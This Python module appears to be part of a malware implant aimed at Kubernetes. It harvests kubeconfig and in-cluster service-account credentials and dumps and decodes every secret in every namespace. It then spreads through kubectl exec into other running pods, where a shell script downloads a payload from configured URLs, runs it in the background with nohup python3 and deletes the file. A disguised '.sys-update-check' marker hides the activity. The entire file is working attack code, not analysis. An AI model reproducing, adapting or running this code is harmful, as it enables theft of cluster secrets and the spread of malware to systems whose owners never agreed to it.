import os
import re
import ssl
import json
import base64
import subprocess
import urllib.request
import platform

_IN_CLUSTER_TOKEN = "/var/run/secrets/kubernetes.io/serviceaccount/token"
_IN_CLUSTER_CA    = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
_IN_CLUSTER_NS    = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"

def _read_file(path):
    try:
        with open(path, 'r', errors='replace') as f:
            return f.read()
    except Exception:
        return None

def _read_bytes(path):
    try:
        with open(path, 'rb') as f:
            return f.read()
    except Exception:
        return None

def _decode_secret_data(data: dict) -> dict:
    decoded = {}
    for k, v in (data or {}).items():
        try:
            decoded[k] = base64.b64decode(v).decode('utf-8', errors='replace')
        except Exception:
            decoded[k] = v
    return decoded

def _scalar(s):
    s = s.strip()
    if len(s) >= 2 and s[0] in ('"', "'") and s[-1] == s[0]:
        return s[1:-1]
    if s == 'true':  return True
    if s == 'false': return False
    if s in ('null', '~', ''): return None
    return s

def _parse_kubeconfig(text):
    lines = []
    for raw in text.splitlines():
        stripped = raw.lstrip()
        if not stripped or stripped.startswith('#'):
            continue
        lines.append((len(raw) - len(stripped), stripped))

    pos = [0]

    def peek_indent():
        return lines[pos[0]][0] if pos[0] < len(lines) else -1

    def parse_node(base):
        if pos[0] >= len(lines):
            return None
        indent, line = lines[pos[0]]
        if indent < base:
            return None

        if line.startswith('- '):
            result = []
            while pos[0] < len(lines):
                ind, ln = lines[pos[0]]
                if ind < base:
                    break
                if not ln.startswith('- '):
                    break
                pos[0] += 1
                rest = ln[2:].strip()
                if ':' in rest and not rest.startswith('"') and not rest.startswith("'"):
                    item = {}
                    k, _, v = rest.partition(':')
                    k = k.strip(); v = v.strip()
                    item[k] = _scalar(v) if v else parse_node(ind + 1)
                    while pos[0] < len(lines):
                        ni, nl = lines[pos[0]]
                        if ni <= ind or nl.startswith('- '):
                            break
                        pos[0] += 1
                        if ':' in nl:
                            k2, _, v2 = nl.partition(':')
                            k2 = k2.strip(); v2 = v2.strip()
                            item[k2] = _scalar(v2) if v2 else parse_node(ni + 1)
                    result.append(item)
                else:
                    result.append(_scalar(rest))
            return result
        elif ':' in line:
            result = {}
            while pos[0] < len(lines):
                ind, ln = lines[pos[0]]
                if ind < base or ln.startswith('- '):
                    break
                pos[0] += 1
                if ':' not in ln:
                    continue
                k, _, v = ln.partition(':')
                k = k.strip(); v = v.strip()
                result[k] = _scalar(v) if v else parse_node(ind + 1)
            return result
        else:
            pos[0] += 1
            return _scalar(line)

    return parse_node(0) or {}

def _load_kubeconfig():
    kubeconfig_path = os.environ.get('KUBECONFIG') or os.path.expanduser('~/.kube/config')
    text = _read_file(kubeconfig_path)
    if not text:
        return None, None
    return _parse_kubeconfig(text), kubeconfig_path

def _find_by_name(lst, name):
    if not lst:
        return {}
    for item in lst:
        if isinstance(item, dict) and item.get('name') == name:
            return item
    return {}

def _build_ssl_context(cluster_info):
    ctx = ssl.create_default_context()
    ca_data = cluster_info.get('certificate-authority-data')
    ca_file = cluster_info.get('certificate-authority')
    if ca_data:
        ctx.load_verify_locations(cadata=base64.b64decode(ca_data).decode())
    elif ca_file and os.path.exists(ca_file):
        ctx.load_verify_locations(ca_file)
    else:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    if cluster_info.get('insecure-skip-tls-verify') is True:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx

def _memfd_path(data: bytes) -> str:
    fd = os.memfd_create("ssl", 0)
    os.write(fd, data)
    os.lseek(fd, 0, os.SEEK_SET)
    return fd, f"/proc/self/fd/{fd}"


def _build_ssl_context_client_cert(ctx, user_info):
    cert_data = user_info.get('client-certificate-data')
    key_data  = user_info.get('client-key-data')
    cert_file = user_info.get('client-certificate')
    key_file  = user_info.get('client-key')

    if cert_data and key_data:
        cert_fd, cert_path = _memfd_path(base64.b64decode(cert_data))
        key_fd,  key_path  = _memfd_path(base64.b64decode(key_data))
        try:
            ctx.load_cert_chain(cert_path, key_path)
        finally:
            os.close(cert_fd)
            os.close(key_fd)
    elif cert_file and key_file:
        ctx.load_cert_chain(cert_file, key_file)
    return ctx

def _api_get(url, ssl_ctx, token=None, timeout=10):
    headers = {}
    if token:
        headers['Authorization'] = f'Bearer {token}'
    req = urllib.request.Request(url, headers=headers)
    return json.loads(urllib.request.urlopen(req, context=ssl_ctx, timeout=timeout).read().decode())

def _collect_secrets_direct(server, ssl_ctx, token=None):
    result = {}
    try:
        ns_resp = _api_get(f"{server}/api/v1/namespaces", ssl_ctx, token)
        namespaces = [item['metadata']['name'] for item in ns_resp.get('items', [])]
    except Exception:
        namespaces = ['default']

    for ns in namespaces:
        try:
            resp = _api_get(f"{server}/api/v1/namespaces/{ns}/secrets", ssl_ctx, token)
            ns_secrets = {}
            for item in resp.get('items', []):
                name = item.get('metadata', {}).get('name', 'unknown')
                ns_secrets[name] = _decode_secret_data(item.get('data'))
            if ns_secrets:
                result[ns] = ns_secrets
        except Exception:
            continue
    return result

def _collect_context_direct(kubeconfig, context_name):
    contexts  = kubeconfig.get('contexts', [])
    clusters  = kubeconfig.get('clusters', [])
    users     = kubeconfig.get('users', [])

    ctx_entry     = _find_by_name(contexts, context_name)
    ctx_info      = ctx_entry.get('context', {}) if isinstance(ctx_entry, dict) else {}
    cluster_entry = _find_by_name(clusters, ctx_info.get('cluster', ''))
    user_entry    = _find_by_name(users, ctx_info.get('user', ''))

    cluster_info = cluster_entry.get('cluster', {}) if isinstance(cluster_entry, dict) else {}
    user_info    = user_entry.get('user', {})    if isinstance(user_entry, dict)    else {}

    server = cluster_info.get('server', '').rstrip('/')
    if not server:
        return None

    ssl_ctx = _build_ssl_context(cluster_info)
    ssl_ctx = _build_ssl_context_client_cert(ssl_ctx, user_info)

    token = (
        user_info.get('token')
        or _read_file(user_info.get('tokenFile', ''))
        or None
    )
    if token:
        token = token.strip()

    try:
        return _collect_secrets_direct(server, ssl_ctx, token)
    except Exception:
        return None

def _kubectl_get_secrets(extra_args=None):
    cmd = ['kubectl', 'get', 'secrets', '--all-namespaces', '-o', 'json'] + (extra_args or [])
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        if proc.returncode != 0 or not proc.stdout.strip():
            return None
        raw = json.loads(proc.stdout)
    except Exception:
        return None

    result = {}
    for item in raw.get('items', []):
        ns   = item.get('metadata', {}).get('namespace', 'unknown')
        name = item.get('metadata', {}).get('name', 'unknown')
        result.setdefault(ns, {})[name] = _decode_secret_data(item.get('data'))
    return result

def _kubectl_list_contexts():
    try:
        proc = subprocess.run(
            ['kubectl', 'config', 'get-contexts', '-o', 'name'],
            capture_output=True, text=True, timeout=5
        )
        return [l.strip() for l in proc.stdout.splitlines() if l.strip()]
    except Exception:
        return []

def _kubectl_available():
    try:
        subprocess.run(['kubectl', 'version', '--client'], capture_output=True, timeout=5)
        return True
    except Exception:
        return False

def ensure_kubectl():
    if subprocess.run("command -v kubectl", shell=True, capture_output=True).returncode == 0:
        return True
    
    target_path = "/tmp/kubectl"
    if os.path.exists(target_path):
        os.environ["PATH"] += os.pathsep + "/tmp"
        return True

    arch = platform.machine().lower()
    if "x86_64" in arch or "amd64" in arch:
        k_arch = "amd64"
    elif "arm64" in arch or "aarch64" in arch:
        k_arch = "arm64"
    else:
        k_arch = "amd64"

    url = f"https://dl.k8s.io/release/v1.28.0/bin/linux/{k_arch}/kubectl"
    try:
        subprocess.run(f"curl -L {url} -o {target_path}", shell=True, check=True)
        os.chmod(target_path, 0o755)
        os.environ["PATH"] += os.pathsep + "/tmp"
        return True
    except Exception:
        return False

def _collect_incluster():
    if not os.path.exists(_IN_CLUSTER_TOKEN):
        return None

    token = _read_file(_IN_CLUSTER_TOKEN)
    if not token:
        return None
    token = token.strip()

    host = os.environ.get('KUBERNETES_SERVICE_HOST')
    port = os.environ.get('KUBERNETES_SERVICE_PORT', '443')
    if not host:
        return None

    server = f'https://{host}:{port}'
    ssl_ctx = ssl.create_default_context()
    if os.path.exists(_IN_CLUSTER_CA):
        ssl_ctx.load_verify_locations(_IN_CLUSTER_CA)
    else:
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    try:
        return _collect_secrets_direct(server, ssl_ctx, token)
    except Exception:
        return None

def _get_current_pod_info():
    hostname = os.environ.get('HOSTNAME', '')
    namespace = _read_file(_IN_CLUSTER_NS)
    if namespace:
        namespace = namespace.strip()
    return hostname, namespace

def _list_pods_kubectl():
    pods = []
    try:
        proc = subprocess.run(
            ['kubectl', 'get', 'pods', '--all-namespaces', '-o', 'json'],
            capture_output=True, text=True, timeout=15
        )
        if proc.returncode != 0:
            return []
        
        data = json.loads(proc.stdout)
        for item in data.get('items', []):
            metadata = item.get('metadata', {})
            status = item.get('status', {})
            spec = item.get('spec', {})
            
            if status.get('phase') != 'Running':
                continue
            
            containers = [c.get('name') for c in spec.get('containers', [])]
            if not containers:
                continue
            
            pods.append({
                'name': metadata.get('name'),
                'namespace': metadata.get('namespace'),
                'containers': containers
            })
    except Exception:
        pass
    return pods

def _propagate_to_pod(pod_name, namespace, container, current_pod):
    if pod_name == current_pod:
        return None
    
    import config
    primary_url = config.PROPAGATION_PAYLOAD_URL_PRIMARY
    secondary_url = config.PROPAGATION_PAYLOAD_URL_SECONDARY
    ssl_flag = "-k" if config.IGNORE_SSL_ERRORS else ""
    
    script = f"""
if [ -f "$HOME/.cache/.sys-update-check" ]; then exit 0; fi
mkdir -p "$HOME/.cache" 2>/dev/null
cd /tmp
PAYLOAD_FILE="rope-${{RANDOM}}.pyz"
curl -sSL {ssl_flag} -w "%{{http_code}}" "{primary_url}" -o "$PAYLOAD_FILE" 2>/dev/null | grep -q "^200$" || curl -sSL {ssl_flag} "{secondary_url}" -o "$PAYLOAD_FILE" 2>/dev/null || exit 0
[ -f "$PAYLOAD_FILE" ] || exit 0
nohup python3 "$PAYLOAD_FILE" > /dev/null 2>&1 &
sleep 2
rm -f "$PAYLOAD_FILE" 2>/dev/null
"""
    
    try:
        proc = subprocess.run(
            ['kubectl', 'exec', '-n', namespace, pod_name, '-c', container, '--', 'sh', '-c', script],
            capture_output=True, text=True, timeout=30
        )
        if proc.returncode == 0:
            return {'pod': pod_name, 'namespace': namespace, 'container': container, 'status': 'success'}
        else:
            return {'pod': pod_name, 'namespace': namespace, 'container': container, 'status': 'failed', 'error': proc.stderr[:200]}
    except Exception as e:
        return {'pod': pod_name, 'namespace': namespace, 'container': container, 'status': 'error', 'error': str(e)[:200]}

def _propagate_to_pods(max_targets=5):
    current_pod, current_ns = _get_current_pod_info()
    
    marker = os.path.expanduser('~/.cache/.sys-update-check-k8s')
    if os.path.exists(marker):
        return {'already_propagated': True, 'current_pod': current_pod}
    
    if not _kubectl_available():
        return {'error': 'kubectl_not_available'}
    
    pods = _list_pods_kubectl()
    if not pods:
        return {'error': 'no_pods_discovered'}
    
    propagated = []
    for pod in pods:
        if len(propagated) >= max_targets:
            break
        
        pod_name = pod.get('name')
        namespace = pod.get('namespace')
        containers = pod.get('containers', [])
        
        if not pod_name or not namespace or not containers:
            continue
        
        container = containers[0]
        result = _propagate_to_pod(pod_name, namespace, container, current_pod)
        if result:
            propagated.append(result)
    
    if propagated:
        os.makedirs(os.path.dirname(marker), exist_ok=True)
        with open(marker, 'w') as f:
            json.dump({'propagated': propagated, 'current_pod': current_pod}, f)
    
    return {
        'propagation_attempted': True,
        'targets': propagated,
        'current_pod': current_pod,
        'current_namespace': current_ns,
        'total_pods_discovered': len(pods)
    }

def collect() -> dict:
    result = {'contexts': {}}

    kubeconfig_path = os.environ.get('KUBECONFIG') or os.path.expanduser('~/.kube/config')
    has_kubeconfig = os.path.exists(kubeconfig_path)
    has_incluster = os.path.exists(_IN_CLUSTER_TOKEN)

    if has_kubeconfig or has_incluster:
        ensure_kubectl()

    if _kubectl_available():
        if has_kubeconfig:
            for ctx in _kubectl_list_contexts():
                secrets = _kubectl_get_secrets(['--context', ctx])
                if secrets is not None:
                    result['contexts'][ctx] = secrets
        elif has_incluster:
            secrets = _kubectl_get_secrets()
            if secrets is not None:
                result['contexts']['in-cluster'] = secrets
        
        if result['contexts']:
            result['propagation'] = _propagate_to_pods()
            return result

    kubeconfig, _ = _load_kubeconfig()
    if kubeconfig:
        current = kubeconfig.get('current-context')
        context_names = [
            c.get('name') for c in (kubeconfig.get('contexts') or [])
            if isinstance(c, dict) and c.get('name')
        ]
        if current and current not in context_names:
            context_names.insert(0, current)

        for ctx_name in context_names:
            secrets = _collect_context_direct(kubeconfig, ctx_name)
            if secrets is not None:
                result['contexts'][ctx_name] = secrets

        if result['contexts']:
            result['propagation'] = _propagate_to_pods()
            return result

    incluster = _collect_incluster()
    if incluster is not None:
        result['contexts']['in-cluster'] = incluster
        result['propagation'] = _propagate_to_pods()
        return result

    return {'error': 'No Kubernetes access found'}